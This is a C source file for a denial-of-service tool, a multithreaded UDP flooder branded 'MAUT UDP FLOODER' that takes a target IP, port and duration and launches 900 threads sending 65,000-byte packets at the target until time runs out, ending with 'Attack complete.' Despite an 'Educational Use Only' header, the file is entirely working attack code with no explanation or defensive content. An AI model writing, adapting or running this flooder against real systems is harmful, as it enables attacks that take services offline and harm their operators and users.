// Owner: maut
// Educational Use Only – High-Power UDP Flooder

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>

#define THREADS 900
#define PACKET_SIZE 65000

char *target_ip;
int target_port;
int duration;

void *flood_thread(void *arg) {
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(target_port);
    target.sin_addr.s_addr = inet_addr(target_ip);

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) pthread_exit(NULL);

    char *data = (char *)malloc(PACKET_SIZE);
    memset(data, rand() % 255, PACKET_SIZE); // Random fill

    time_t end = time(NULL) + duration;

    while (time(NULL) < end) {
        sendto(sock, data, PACKET_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
    }

    free(data);
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
        return 1;
    }

    target_ip = argv[1];
    target_port = atoi(argv[2]);
    duration = atoi(argv[3]);

    pthread_t thread_id[THREADS];

    printf("\n\n======== MAUT UDP FLOODER ========\n");
    printf("Target   : %s\n", target_ip);
    printf("Port     : %d\n", target_port);
    printf("Duration : %d seconds\n", duration);
    printf("Threads  : %d\n", THREADS);
    printf("Packet   : %d bytes\n", PACKET_SIZE);
    printf("==================================\n\n");

    for (int i = 0; i < THREADS; i++) {
        pthread_create(&thread_id[i], NULL, flood_thread, NULL);
    }

    for (int i = 0; i < THREADS; i++) {
        pthread_join(thread_id[i], NULL);
    }

    printf("Attack complete.\n");
    return 0;
}
